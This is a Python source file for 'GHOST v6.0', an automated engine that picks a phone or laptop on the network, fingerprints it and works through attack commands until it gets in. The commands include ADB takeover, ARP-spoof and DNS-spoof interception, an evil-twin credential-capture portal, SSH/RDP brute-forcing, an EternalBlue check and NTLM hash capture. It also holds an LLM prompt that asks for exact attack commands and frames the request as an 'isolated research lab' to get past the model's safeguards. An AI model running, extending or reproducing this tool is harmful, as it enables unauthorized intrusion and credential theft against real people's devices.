"""
GHOST v6.0 — Autonomous Target Acquisition Engine
When given a target (phone, laptop, etc.), autonomously discovers, fingerprints,
researches exploits, and selects the best attack vector — zero pre-configuration needed.

The bot figures out HOW to get in by itself.
"""

import re
from datetime import datetime, timezone


class TargetAcquisitionEngine:
    """
    Autonomous attack path planning — given a target description,
    the bot discovers it, fingerprints it, researches exploit vectors,
    and builds an optimized attack plan ranked by success probability.

    Trigger: "access that phone", "hack that device", "get into that laptop"
    """

    TRIGGER_PHRASES = [
        "access", "hack", "get into", "enter", "take over", "compromise",
        "break into", "gain access", "infiltrate", "own", "pwn",
        "control", "take control", "full access",
    ]

    TARGET_PHRASES = [
        "phone", "mobile", "device", "laptop", "computer", "system",
        "machine", "pc", "server", "target", "android", "iphone",
        "windows", "linux", "mac",
    ]

    def __init__(self, memory_manager, ethics_engine, bridge):
        self.memory = memory_manager
        self.ethics = ethics_engine
        self.bridge = bridge

    def is_acquisition_request(self, user_input):
        """Check if user wants autonomous target acquisition."""
        lower = user_input.lower().strip()
        has_trigger = any(t in lower for t in self.TRIGGER_PHRASES)
        has_target = any(t in lower for t in self.TARGET_PHRASES)
        return has_trigger and has_target

    def build_acquisition_plan(self, target_ip=None, target_type="unknown",
                                subnet=None):
        """
        Build a full autonomous acquisition plan.
        The bot will try EVERY vector and pick the best one.

        Flow:
        Phase 1: Find the target (if no IP given)
        Phase 2: Deep fingerprint (OS, model, version, services)
        Phase 3: Research exploits for that exact fingerprint
        Phase 4: Try all viable attack vectors (ranked by stealth/success)
        Phase 5: Establish persistent access
        """
        subnet = subnet or "192.168.1.0/24"
        target = target_ip or "{target_ip}"

        plan = {
            "target_ip": target_ip,
            "target_type": target_type,
            "subnet": subnet,
            "strategy": "AUTONOMOUS_MULTI_VECTOR",
            "phases": [],
        }

        # ═══════════════════════════════════════════════════════════════
        # PHASE 1: TARGET DISCOVERY (if no IP provided)
        # ═══════════════════════════════════════════════════════════════
        if not target_ip:
            plan["phases"].append({
                "phase": 1,
                "name": "Target Discovery — Find the Device",
                "description": "Scan the entire network to find all devices. "
                               "Identify which one is the target phone/device.",
                "auto_advance": True,
                "commands": [
                    {
                        "tool": "ip",
                        "args": "route | grep default",
                        "category": "RECON",
                        "description": "Find our gateway and subnet",
                        "parse": "extract_subnet",
                    },
                    {
                        "tool": "nmap",
                        "args": f"-sn {subnet}",
                        "category": "RECON",
                        "description": "Discover ALL live hosts on the network",
                        "parse": "extract_hosts",
                    },
                    {
                        "tool": "nmap",
                        "args": f"-sV -O --osscan-guess {subnet}",
                        "category": "RECON",
                        "description": "OS fingerprint every host — identify phones vs laptops vs IoT",
                        "parse": "identify_targets",
                    },
                ],
            })

        # ═══════════════════════════════════════════════════════════════
        # PHASE 2: DEEP FINGERPRINTING
        # ═══════════════════════════════════════════════════════════════
        plan["phases"].append({
            "phase": 2,
            "name": "Deep Fingerprint — Know Your Target",
            "description": "Full service scan + OS detection. Learn exact model, "
                           "OS version, open ports, running services.",
            "auto_advance": True,
            "commands": [
                {
                    "tool": "nmap",
                    "args": f"-sV -sC -O -A -p- --version-all {target}",
                    "category": "RECON",
                    "description": "FULL port scan (all 65535 ports) + service version + OS + scripts",
                    "timeout": 600,
                },
                {
                    "tool": "nmap",
                    "args": f"-sU --top-ports 100 {target}",
                    "category": "RECON",
                    "description": "UDP scan — find hidden services (SNMP, DNS, TFTP, etc.)",
                    "timeout": 300,
                },
            ],
        })

        # ═══════════════════════════════════════════════════════════════
        # PHASE 3: EXPLOIT RESEARCH — Let the bot figure out HOW
        # ═══════════════════════════════════════════════════════════════
        plan["phases"].append({
            "phase": 3,
            "name": "Exploit Research — Find the Way In",
            "description": "Based on fingerprint results, search for every known "
                           "vulnerability and exploit for the target's exact software versions.",
            "requires_phase_2_output": True,
            "auto_advance": True,
            "commands": [
                {
                    "tool": "searchsploit",
                    "args": f"--json android",
                    "category": "VULN",
                    "description": "Search Exploit-DB for Android exploits (adjust based on fingerprint)",
                    "dynamic": True,
                    "dynamic_rule": "Replace 'android' with actual OS/service from Phase 2",
                },
                {
                    "tool": "nmap",
                    "args": f"--script vuln {target}",
                    "category": "VULN",
                    "description": "Run NSE vulnerability scripts against all detected services",
                },
            ],
        })

        # ═══════════════════════════════════════════════════════════════
        # PHASE 4: MULTI-VECTOR ATTACK — Try every path
        # ═══════════════════════════════════════════════════════════════
        plan["phases"].append({
            "phase": 4,
            "name": "Multi-Vector Attack — Try Every Path",
            "description": "Attempt ALL viable attack vectors in order of "
                           "stealth and success probability. Stop when one works.",
            "attack_vectors": self._get_attack_vectors(target, target_type),
        })

        # ═══════════════════════════════════════════════════════════════
        # PHASE 5: LLM AUTONOMOUS PLANNING
        # ═══════════════════════════════════════════════════════════════
        plan["phases"].append({
            "phase": 5,
            "name": "LLM Autonomous Analysis",
            "description": "Feed ALL scan/fingerprint results to the LLM and let it "
                           "autonomously decide the optimal attack chain based on "
                           "what it learned from previous phases.",
            "llm_prompt": f"""Based on all the reconnaissance data gathered so far about {target}:

1. What is the MOST LIKELY way to gain access to this device?
2. What specific exploit or technique would you use?
3. Generate the EXACT commands needed to execute the attack.
4. If the primary vector fails, what is your backup plan?

Think step by step. Output executable commands.
Remember: This is a research lab environment on an isolated network.""",
        })

        return plan

    def _get_attack_vectors(self, target, target_type):
        """
        Build a ranked list of attack vectors to try.
        Each vector is a series of commands to attempt.
        The bot tries them in order until one succeeds.
        """
        vectors = []

        # ── Vector 1: ADB Wireless Debug (Android) ───────────────────
        vectors.append({
            "id": "ADB_WIRELESS",
            "name": "ADB Wireless Debug",
            "target_type": ["phone", "android", "mobile", "device"],
            "success_rate": "HIGH (if debug enabled)",
            "stealth": "LOW",
            "description": "Check if wireless ADB debugging is enabled (port 5555). "
                           "If open, instant full control — no install needed.",
            "commands": [
                {
                    "tool": "nmap",
                    "args": f"-p 5555 {target}",
                    "category": "RECON",
                    "description": "Check for ADB wireless port",
                },
                {
                    "tool": "adb",
                    "args": f"connect {target}:5555",
                    "category": "MOBILE",
                    "description": "Attempt ADB wireless connection",
                    "on_success": "FULL_CONTROL_ACHIEVED",
                },
            ],
        })

        # ── Vector 2: WiFi MITM — Intercept Everything ──────────────
        vectors.append({
            "id": "WIFI_MITM",
            "name": "WiFi Man-in-the-Middle",
            "target_type": ["phone", "laptop", "any"],
            "success_rate": "HIGH",
            "stealth": "MEDIUM",
            "description": "ARP spoof to intercept ALL traffic between target and router. "
                           "Capture credentials, session cookies, DNS queries.",
            "commands": [
                {
                    "tool": "bettercap",
                    "args": f"-iface eth0 -eval 'set arp.spoof.targets {target}; arp.spoof on; net.sniff on'",
                    "category": "EXPLOIT",
                    "description": "ARP spoof to MITM all target traffic",
                    "background": True,
                },
            ],
        })

        # ── Vector 3: WiFi Deauth + Evil Twin + Captive Portal ──────
        vectors.append({
            "id": "EVIL_TWIN_CAPTIVE",
            "name": "Evil Twin with Captive Portal",
            "target_type": ["phone", "laptop", "any"],
            "success_rate": "MEDIUM-HIGH",
            "stealth": "LOW",
            "description": "Deauth the target from real WiFi → clone the AP → "
                           "target reconnects to our fake AP → serve captive portal "
                           "that captures credentials. No install needed.",
            "commands": [
                {
                    "tool": "airmon-ng",
                    "args": "start wlan0",
                    "category": "WIRELESS",
                    "description": "Enable monitor mode",
                },
                {
                    "tool": "airodump-ng",
                    "args": "wlan0mon",
                    "category": "WIRELESS",
                    "description": "Scan for target's connected AP",
                    "timeout": 15,
                    "parse": "find_target_ap",
                },
                {
                    "tool": "wifiphisher",
                    "args": "--essid {target_ssid} -p firmware-upgrade",
                    "category": "WIRELESS",
                    "description": "Create Evil Twin + serve fake firmware update page to capture creds",
                },
            ],
        })

        # ── Vector 4: Bluetooth Attack ──────────────────────────────
        vectors.append({
            "id": "BLUETOOTH",
            "name": "Bluetooth Exploitation",
            "target_type": ["phone", "laptop", "device"],
            "success_rate": "MEDIUM",
            "stealth": "MEDIUM",
            "description": "Scan for Bluetooth-enabled devices. Attempt pairing, "
                           "OBEX push, or known BT vulnerabilities (BlueBorne, KNOB).",
            "commands": [
                {
                    "tool": "hcitool",
                    "args": "scan",
                    "category": "RECON",
                    "description": "Scan for nearby Bluetooth devices",
                },
                {
                    "tool": "hcitool",
                    "args": f"info {target}",
                    "category": "RECON",
                    "description": "Get device info (name, class, manufacturer)",
                },
                {
                    "tool": "sdptool",
                    "args": f"browse {target}",
                    "category": "RECON",
                    "description": "List available Bluetooth services",
                },
                {
                    "tool": "searchsploit",
                    "args": "bluetooth android",
                    "category": "VULN",
                    "description": "Search for Bluetooth exploits (BlueBorne, etc.)",
                },
            ],
        })

        # ── Vector 5: Network Service Exploitation ──────────────────
        vectors.append({
            "id": "SERVICE_EXPLOIT",
            "name": "Network Service Exploitation",
            "target_type": ["any"],
            "success_rate": "VARIES",
            "stealth": "LOW",
            "description": "Based on open ports from Phase 2, exploit specific services: "
                           "SSH brute-force, SMB exploits, HTTP vulns, etc.",
            "commands": [
                {
                    "tool": "nmap",
                    "args": f"--script vuln,exploit {target}",
                    "category": "VULN",
                    "description": "Run all NSE vulnerability and exploit scripts",
                },
            ],
            "port_specific_attacks": {
                "22": {
                    "tool": "hydra",
                    "args": f"-l root -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                    "description": "SSH brute-force",
                },
                "80": {
                    "tool": "nikto",
                    "args": f"-h http://{target}",
                    "description": "Web server vulnerability scan",
                },
                "443": {
                    "tool": "nikto",
                    "args": f"-h https://{target}",
                    "description": "HTTPS vulnerability scan",
                },
                "445": {
                    "tool": "msfconsole",
                    "args": f"-q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; check; exit'",
                    "description": "EternalBlue SMB exploit check",
                },
                "3389": {
                    "tool": "hydra",
                    "args": f"-l administrator -P /usr/share/wordlists/rockyou.txt rdp://{target}",
                    "description": "RDP brute-force",
                },
                "8080": {
                    "tool": "whatweb",
                    "args": f"http://{target}:8080 -v",
                    "description": "Web app fingerprinting on 8080",
                },
            },
        })

        # ── Vector 6: Metasploit Auto-Exploit ───────────────────────
        vectors.append({
            "id": "MSF_AUTO",
            "name": "Metasploit Auto-Exploit",
            "target_type": ["any"],
            "success_rate": "MEDIUM",
            "stealth": "LOW",
            "description": "Let Metasploit automatically select and try exploits "
                           "based on the service versions detected.",
            "commands": [
                {
                    "tool": "msfconsole",
                    "args": f"-q -x 'db_nmap -sV {target}; vulns; exit'",
                    "category": "EXPLOIT",
                    "description": "Nmap through MSF + auto vulnerability matching",
                },
            ],
        })

        # ── Vector 7: DNS Spoofing / Redirect ───────────────────────
        vectors.append({
            "id": "DNS_SPOOF",
            "name": "DNS Spoofing + Phishing",
            "target_type": ["phone", "laptop", "any"],
            "success_rate": "MEDIUM",
            "stealth": "MEDIUM",
            "description": "Spoof DNS replies so when the target visits a known site "
                           "(Google, Facebook), they see our cloned login page instead.",
            "commands": [
                {
                    "tool": "bettercap",
                    "args": f"-iface eth0 -eval 'set dns.spoof.domains google.com,facebook.com; "
                            f"set dns.spoof.address {{our_ip}}; dns.spoof on; "
                            f"set arp.spoof.targets {target}; arp.spoof on'",
                    "category": "EXPLOIT",
                    "description": "ARP spoof + DNS spoof — redirect target's browsing",
                    "background": True,
                },
                {
                    "tool": "setoolkit",
                    "args": "",
                    "category": "SOCIAL_ENGINEERING",
                    "description": "Run SET credential harvester on our machine "
                                   "to capture the redirected login",
                },
            ],
        })

        # ── Vector 8: Responder (Credential Capture) ────────────────
        vectors.append({
            "id": "RESPONDER",
            "name": "LLMNR/NBT-NS Poisoning",
            "target_type": ["laptop", "computer", "windows"],
            "success_rate": "HIGH (Windows targets)",
            "stealth": "MEDIUM",
            "description": "Poison LLMNR/NBT-NS broadcasts to capture NTLMv2 hashes "
                           "when target tries to access any network share.",
            "commands": [
                {
                    "tool": "responder",
                    "args": "-I eth0 -wrf",
                    "category": "AD",
                    "description": "Start Responder — captures NTLM hashes from any Windows auth attempt",
                    "background": True,
                },
            ],
        })

        # Filter vectors by target type
        if target_type and target_type != "unknown":
            vectors = [v for v in vectors
                       if target_type.lower() in [t.lower() for t in v["target_type"]]
                       or "any" in v["target_type"]]

        return vectors

    def get_vector_summary(self):
        """Get a human-readable summary of all attack vectors."""
        vectors = self._get_attack_vectors("{target}", "unknown")
        lines = ["GHOST v6.0 — Autonomous Attack Vectors:\n"]
        for i, v in enumerate(vectors, 1):
            lines.append(f"  [{i}] {v['name']}")
            lines.append(f"      Success: {v['success_rate']} | Stealth: {v['stealth']}")
            lines.append(f"      {v['description'][:80]}...")
            lines.append("")
        return "\n".join(lines)

    def execute_plan(self, plan, socketio=None):
        """
        Execute the acquisition plan autonomously.
        Tries attack vectors in order, feeds results back to LLM,
        and lets the LLM decide the optimal next step.
        """
        results = {
            "target": plan.get("target_ip", "unknown"),
            "strategy": plan.get("strategy"),
            "phases_completed": [],
            "vectors_attempted": [],
            "access_achieved": False,
        }

        for phase in plan.get("phases", []):
            phase_result = {
                "phase": phase.get("phase"),
                "name": phase.get("name"),
                "results": [],
            }

            # Handle attack vector phases
            if "attack_vectors" in phase:
                for vector in phase["attack_vectors"]:
                    vector_result = {
                        "vector_id": vector["id"],
                        "vector_name": vector["name"],
                        "commands": [],
                        "success": False,
                    }

                    if socketio:
                        socketio.emit("acquisition_vector", {
                            "vector": vector["name"],
                            "description": vector["description"],
                        })

                    for cmd_info in vector.get("commands", []):
                        full_command = f"{cmd_info['tool']} {cmd_info['args']}"
                        target_ip = self.bridge._extract_ip(full_command)

                        # Ethics check
                        verdict = self.ethics.check_command(full_command, target_ip)

                        cmd_result = {
                            "command": full_command,
                            "verdict": verdict["verdict"],
                        }

                        if verdict["verdict"] == "HALT":
                            cmd_result["halted"] = verdict["reason"]
                        elif verdict["verdict"] in ["ALLOW", "PROPOSE"]:
                            mode = self.memory.get_mode()
                            if mode == "AUTONOMOUS" or verdict["verdict"] == "ALLOW":
                                exec_result = self.bridge.execute_command(
                                    full_command, timeout=cmd_info.get("timeout", 120)
                                )
                                cmd_result["output"] = exec_result
                                cmd_result["executed"] = True

                                # Check for success indicators
                                stdout = exec_result.get("stdout", "")
                                if any(s in stdout.lower() for s in [
                                    "connected", "session opened", "meterpreter",
                                    "shell", "access granted", "success",
                                ]):
                                    vector_result["success"] = True
                                    results["access_achieved"] = True
                            else:
                                cmd_result["awaiting_approval"] = True

                        vector_result["commands"].append(cmd_result)

                        # If this vector succeeded, stop trying more
                        if vector_result["success"]:
                            break

                    results["vectors_attempted"].append(vector_result)

                    # If we got access, stop trying more vectors
                    if vector_result["success"]:
                        break

            # Handle LLM autonomous phase
            elif "llm_prompt" in phase:
                llm_result = self.bridge.ask_llm(phase["llm_prompt"])
                phase_result["llm_response"] = llm_result.get("response", "")
                phase_result["llm_commands"] = llm_result.get("commands", [])

                if socketio:
                    socketio.emit("acquisition_llm", {
                        "response": llm_result.get("response", ""),
                        "commands": llm_result.get("commands", []),
                    })

            # Handle regular command phases
            else:
                for cmd_info in phase.get("commands", []):
                    full_command = f"{cmd_info['tool']} {cmd_info['args']}"
                    target_ip = self.bridge._extract_ip(full_command)
                    verdict = self.ethics.check_command(full_command, target_ip)

                    cmd_result = {
                        "command": full_command,
                        "verdict": verdict["verdict"],
                    }

                    if verdict["verdict"] != "HALT":
                        mode = self.memory.get_mode()
                        if mode == "AUTONOMOUS" or verdict["verdict"] == "ALLOW":
                            exec_result = self.bridge.execute_command(
                                full_command, timeout=cmd_info.get("timeout", 120)
                            )
                            cmd_result["output"] = exec_result
                            cmd_result["executed"] = True

                    phase_result["results"].append(cmd_result)

            results["phases_completed"].append(phase_result)

        return results
